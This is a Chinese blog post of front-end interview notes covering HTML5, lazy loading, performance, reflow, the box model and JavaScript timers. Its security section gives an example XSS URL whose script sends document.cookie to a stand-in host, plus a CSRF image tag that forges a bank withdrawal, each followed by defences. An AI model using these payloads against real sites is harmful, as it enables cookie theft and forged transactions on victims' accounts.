---
layout: post
title: "前端面试集锦"
date: 2017-06-22 09:00:00 +0800 
categories: 面试与笔试经历
tag: Interview
---
* content
{:toc}

又又又又又又又又又又又又又到了找工作的季节，各大公司又又又又又又又又又又又又又开始招聘了。我作为一个前端菜鸟，又开始慌了。人生没有一个目的很明确的方向真的会浪费很多时间，而浪费的时间都是青春。努努力力，兜兜转转，又要开始思考自己的人生方向了。时间来不及去荒废了，就像歌里面唱的：`来不及认真地年轻，就认真地老去`。

就算很多公司不要你，你也要知道，哪怕现在的你不优秀，也并不意味着你永远不优秀。

按照时间线分割。

<!-- more -->

`2017-04-25`

## HTML5新增了哪些内容或API

+ 增加了语义性内容标签： `<article>`、`<footer>`、`<header>`、`<nav>`、`<section>`
+ 新的表单控件
+ 用于绘图的`canvas`元素
+ 用于媒体回放的`video`和`audio`元素
+ 对本地离线存储的更好的支持

---

## `<input>`和`<textarea>`的区别

`<input>`是一个单行输入框，有value属性，不能自动换行。

`<textarea>`是一个多行输入框，没有value属性，可以自动换行。

---

## 图片懒加载 -- Lazy Load

是延迟加载的一种方式。直到滚动图片出现在用户可视范围内才把它加载出来，与图片预加载技术完全相反。

懒加载的主要实现是通过计算得到什么时候图片会出现在可视范围内。所以要把视口高度、滚动条距离和图片所在的高度进行对比。当前两者的和大于后者，就将图片显示出来。这里有一个自己写的实现:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>lazy loading</title>

    <style>
        img {
            display: block;
            margin: 10px auto;
        }
    </style>
</head>
<body>
<div class="images">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    //使用原生JavaScript实现
    var imgs = document.getElementsByTagName('img');

    function  lazyLoading() {
        //获取滚动条偏移量
        var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
        // 获取视口高度
        var viewportSize = window.innerHeight || document.documentElement.clientHeight;

        for (var i = 0; i < imgs.length; i++){
            var x = scrollTop + viewportSize - imgs[i].offsetTop;
            if ( x > 0){    //如果图片暴露在视野范围之内
                imgs[i].src = imgs[i].getAttribute('data-scr'); //将自定义属性的值赋给src
            }
        }
    }
    lazyLoading();
    window.addEventListener('scroll', lazyLoading, false);
    /*
    //使用jQuery实现
    $(document).ready(function () {
        var lazyLoading = function () {
            var scrollTop = $(window).height();
            var viewportSize = $(window).scrollTop();

            $('img').each(function () {
                var x = scrollTop + viewportSize - $(this).position().top;
                if (x > 0){
                    $(this).attr('src', $(this).attr('data-scr'));
                }
            });
        }
        window.addEventListener('scroll', lazyLoading, false);
    });*/
</script>

</body>
</html>
```

**注意**: jQuery有一个用于实现懒加载的[`lazyload`插件](http://appelsiini.net/projects/lazyload/)

> [参考1](https://segmentfault.com/a/1190000008840116)，[参考2](https://zhuanlan.zhihu.com/p/25455672)

---

## 移动端性能优化

####  加载优化 -- 优化重点

+ **减少HTTP请求**
  + 合并CSS、JavaScript
  + 合并小图片，使用雪碧图
+ **压缩**
  + 压缩HTML/CSS/JavaScript
  + 启用GZip(?)
+ **利用缓存** -- 利用缓存可以减少向服务器的请求数，节省加载时间，所以所有静态资源都可以在服务器端设置缓存
  + 缓存一切可缓存的资源
  + 使用长Cache(?)
  + 使用外联式引用CSS/JavaScript
+ 使用首屏加载 -- 首屏是用户最直观的体验，针对首屏快速显示做优化
+ 按需加载 -- 将不影响首屏的资源和当前屏幕资源不用的资源放到用户需要时才加载
  + 滚屏加载
  + LazyLoad
  + 通过Media Query加载
+ 预加载 -- 增加Loading进度条 
+ 减少Cookie -- Cookie会影响加载速度，所以静态资源域名不使用Cookie
+ 避免重定向 -- 重定向会影响加载速度，所以在服务器正确设置避免重定向
+ 异步加载第三方资源 -- 第三方资源不可控会影响页面的加载和显示，因此要异步加载第三方资源

#### 图片优化

+ 使用(CSS3/SVG/IconFont)替代图片
+ [使用`Srcset`]({{ '/2017/05/25/High-Performance-Responsive-Design' | prepend: site.baseurl }})
+ WebP格式优于JPG， PNG8优于GIF
+ 图片不宽于640

####  CSS优化

+ 尽量避免重设图片大小
+ 图片尽量避免使用DataURL
+ 尽量避免使用内联CSS(即在HTML标签中写Style属性)
+ 移除空的CSS规则
+ 正确使用Display的属性
  + display:inline后不应该再使用width、height、margin、padding以及float
  + display:inline-block后不应该再使用float
  + display:block后不应该再使用vertical-align
  + display:table-*后不应该再使用margin或者float
+ 不滥用Float -- Float在渲染时计算量比较大，尽量减少使用
+ 不滥用Web字体 -- Web字体需要下载，解析，重绘当前页面，尽量减少使用
+ 不声明过多的Font-Size -- 过多的Font-size引发CSS树的效率
+ 标准化各种浏览器前缀
  + 无前缀应放在最后
  + CSS动画只用（-webkit- 无前缀）两种即可
  + 其它前缀为 -webkit- -moz- -ms- 无前缀 四种

#### 脚本优化

+ 减少重绘和回流
+ 缓存DOM选择与计算
+ 缓存列表.length
+ 尽量使用事件代理，避免批量绑定事件
+ 尽量使用ID选择器(???)
+ 使用touchstart、touchend代替click(???)

#### 渲染优化

+ HTML使用Viewport -- <meta name="viewport" content="width=device-width, initial-scale=1">
+ 减少DOM节点
+ 尽量使用CSS3动画
+ 合理使用requestAnimationFrame动画代替setTimeout
+ 适当使用Canvas动画
+ Touchmove、Scroll事件会导致多次渲染

> [参考](http://isux.tencent.com/h5-performance.html)

---

## repaint/reflow 区别

在这开始之前，我们可以先了解一下**浏览器的渲染过程**，下面是几个可靠的文章。

+ [How browsers work](http://taligarsiel.com/Projects/howbrowserswork1.htm) 神文
+ [浏览器的渲染原理简介](http://coolshell.cn/articles/9666.html)

`repaint`: 屏幕的一部分需要重画，但是元素的尺寸没有变，只是外观变了。比如:

+ visibility
+ outline
+ background color

`reflow`: 元素的几何尺寸变了，需要重新布局，重新计算Render tree。 比如:

+ 改变窗口大小
+ 改变字体
+ 增加或删除样式表
+ 内容的改变
+ 激活伪类
+ 操作class属性
+ 脚本操作DOM
+ 设置style属性
+ 计算offsetWidth和offsetHeight

所以，`display:none`触发reflow，而`visibility:hidden`触发repaint。

另外，可以这么说，reflow一定会产生repaint。

所以说，reflow对性能的影响更大。为了避免这种影响，尽量做到:

1. 直接改变向改变的元素，避免通过父元素作用于子元素
2. 避免设置大量的style属性，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow，所以最好是使用class属性
3. 实现元素的动画，它的position属性，最好是设为absoulte或fixed，这样不会影响其他元素的布局
4. 避免table布局，因为table中某个元素旦触发了reflow，那么整个table的元素都会触发reflow

> [参考](https://segmentfault.com/a/1190000006104095)

---

## CSS盒模型

每个元素都表示为一个矩形的盒子。渲染引擎的目的，就是确定这些盒子的尺寸，属性和位置。

![box-model]({{ '/styles/images/interview/box-model.svg' | prepend: site.baseurl }})

+ 内容区: 包含元素真实内容的区域。`height`和`width`用来指定内容区的高度
+ 内边距: 内容与边框之间的间隔。这段距离使用`padding`控制
+ 边框: 边框很好理解，可以设置为不可见(`0px`)。有`boder-width`/`border-style`/`boder-color`等属性
+ 外边距: 用于将两个标签隔开。`margin`控制

> 有些属性，比如`background-color`，会填充边框以内的空白，包括内边距部分。

![box-model]({{ '/styles/images/interview/box-model.png' | prepend: site.baseurl }})

所以盒子边框如何计算。总宽度 = 宽度 + 左右内边距 + 左右边框宽度 + 左右外边距。

CSS3增加了一种新的计算盒子宽度的方式 - `box-sizing`。有三个可选值

+ `content-box`: 浏览器计算宽度和高度的常规方式，默认方式。边框和内边距加到所设宽度和高度上，用来确定元素在屏幕中所占的宽度和高度。
+ `padding-box`: width 和 height属性的值包括内边距。
+ `border-box`: 内边距和边框的宽度都包含在width 和 height中。

> [参考](https://leohxj.gitbooks.io/front-end-database/html-and-css-basic/box-module.html)

---

## 前端安全

#### XSS攻击

XSS(Cross-Site Scripting): 跨站脚本攻击。它允许攻击者将恶意代码植入到用户使用的页面中。攻击目标是**为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息**。

XSS通常可以分为两大类：一类是**存储型XSS**，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序->进入数据库->Web程序->用户浏览器。另一类是**反射型XSS**，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

XSS的原理

Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。

> 比如: 访问有个网站http://127.0.0.1/?name=maoxiaoke会输出用户名字。如果恶意用户传递这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。

如何预防XSS

答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。

+ 将用户所提供的内容进行过滤
+ 使用HTTP头指定类型

> [参考](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md)

#### CSRF攻击

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

可以这样简单的理解：攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。举个栗子，一家银行用于执行转账操作的URL地址如下: http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。一个恶意攻击者在另一个网站放置如下放置如下代码: <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。如果有一个用户访问了这个恶意站点，而他之前刚访问过银行不久，登陆信息尚未过期。攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是**欺骗用户浏览器，让其以用户的名义执行操作**。

从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤 ：

1.登录受信任网站A，并在本地生成Cookie 
2.在不退出A的情况下，访问危险网站B

如何预防CSRF攻击？

CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。

服务端的预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：

1、正确使用GET,POST和Cookie
2、在非GET请求中增加伪随机数
  + 为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值
  + 每个请求使用验证码
  + 不同的表单包含一个不同的伪随机值

> [参考](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.1.md)

---

## 实现布局:左边一张图片，右边一段文字

目的是查看CSS布局，一种是可以使用`float`(浮动)，另一种可以使用`flex`(弹性盒)。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Picture</title>
    <style>
    body {
        display: flex;
    }
    /*using float
    img {
        float: left;
        }
    */
    </style>
</head>
<body>
    <div>
        <img src="https://unsplash.it/200/300/?random" alt="me">
    </div>
    <div>
    <p>Bacon ipsum dolor amet chuck tri-tip kielbasa ham. Tenderloin pork chop doner, biltong kielbasa beef ribs meatball turducken landjaeger fatback chicken ham hock short loin swine. Chuck salami kevin filet mignon sausage jowl. Meatball jowl pork turkey tri-tip. Shank flank beef ribs, rump alcatra turkey t-bone strip steak jerky meatloaf salami cow doner sausage drumstick. Sirloin flank spare ribs, rump ham ribeye kevin pancetta brisket jerky turducken pork chop.</p>
    </div>
</body>
</html>
```

现在我们来复习以下行内元素和块级元素。

#### 行内元素

一个行内元素只占据它对应标签的边框所包含的空间。默认情况下不会以新行开始。

+ b, big, i, small, tt
+ abbr, acronym, cite, code, dfn, em, kbd, strong, samp, var
+ a, bdo, br, img, map, object, q, script, span, sub, sup
+ button, input, label, select, textarea

#### 块级元素

默认情况下，块级元素会新起一行。

虽然”块级“在新的 HTML5 元素中没有明确定义

`<article>  <aside>  <audio>  <canvas>  <figcaption>  <figure>  <footer>  <header>  <hgroup>  <output>   <section>  <video> `(html5)


`<blockquote> <address> <dd> <div> <dl> <fieldset> <form> <h1>, <h2>, <h3>, <h4>, <h5>, <h6> <hr> <noscript> <ol> <p> <pre> <table> <tfoot> <ul>`

---

## 伪类和伪元素的区别

伪类操作对象是文档中已有的元素，而伪元素是创建了一个文档外的元素。比如`a:hover`伪类是对已有的`<a>`进行操作，而`a:before`伪元素是在指定元素之前添加内容。

如何区分伪类和伪元素呢？很简单，伪元素就那么几个:

+ `:before` `:after`
+ `:first-letter` `:first-line`
+ `::selection` `:placeholder` `::backdrop`

> [参考](http://www.alloyteam.com/2016/05/summary-of-pseudo-classes-and-pseudo-elements/)

---

## window.onload和$(document).ready()的区别

+ `window.onload`必须等到页面内包括图片的所有元素加载完毕后才能执行，`$(document).ready()`是DOM结构绘制完毕后就执行，不必等到加载完毕
+ `window.onload`不能同时编写多个，如果有多个`window.onload`方法，只会执行一个，`$(document).ready()`可以同时编写多个，并且都可以得到执行
+ `window.onload`没有简化写法，`$(document).ready(function(){})`可以简写成`$(function(){})`

---

## 浏览器加载转圈结束是哪个时间点

![timing-overview]({{ '/styles/images/timing-overview.png' | prepend: site.baseurl }})

> [图片来源](https://www.w3.org/TR/navigation-timing/)

所以这个时间点是`loadEventEnd`。

具体可参考:

+ [navigation-timing](https://www.w3.org/TR/navigation-timing/)
+ [Navigation Timing API](https://developer.mozilla.org/en-US/docs/Web/API/Navigation_timing_API)
+ [浏览器加载各时间节点对应的状态](http://blog.csdn.net/melody_day/article/details/53505451)

---

## setTimeout和setInterval区别

#### setTimeout 超时调用

因为JavaScript有一个任务队列的要求，所以`setTimeout()`精度不会太高。它返回一个超时调用的ID，可以用来取消超时调用，即将它传递给`clearTimeout()`。

#### setInterval 间歇调用

它会在指定的时间间隔重复执行代码，直至间歇调用被取消或者页面被卸载。但是，回调加入到队列中不管函数是否被执行就开始执行下一次计时，那么当下一次时间到的时候，定时器又向队列中加入回调函数，但此时发现之前的加入的函数还未被执行，此时便会将之后的定时函数取消掉，造成缺失间隔。(这里表示疑问)

#### 如何转化

可以用`setTimeout()`来模拟`setInterval()`，方法就是使用递归。比如:

```js
//setTimeout()
function myTimeoutFunction()
{
    console.log('i am timi');
    setTimeout(myTimeoutFunction, 1000);
}
myTimeoutFunction();
```

功能与下面的代码一致。

```js
function myTimeoutFunction(){
    console.log('i am timi');
}
myTimeoutFunction();
setInterval(myTimeoutFunction, 1000);
```

但是，两者也不是完全没有区别。对于`setTimeout()`而言，必须等待任务队列中的任务完成，才开始进行下一次调用。而`setInterval()`只在定时之后将任务加入队列，才不管是否被执行，所以`setTimeout()`时间花费更大。

另一个问题是，如果想要取消执行。`setInterval()`要更为简单。

```
function myTimeoutFunction(){
    console.log('i am timi');
}
myTimeoutFunction();
var timeId = setInterval(myTimeoutFunction, 1000);

//later on...
clearInterval(timerId);
```

然而，`setTimeout()`需要跟踪每次的迭代。

```js
var timeId = null;
function myTimeoutFunction()
{
    console.log('i am timi');
    timerId = setTimeout(myTimeoutFunction, 1000);
}
myTimeoutFunction();

//later on...
clearTimeout(timerId);
```

> [参考](https://stackoverflow.com/questions/729921/settimeout-or-setinterval)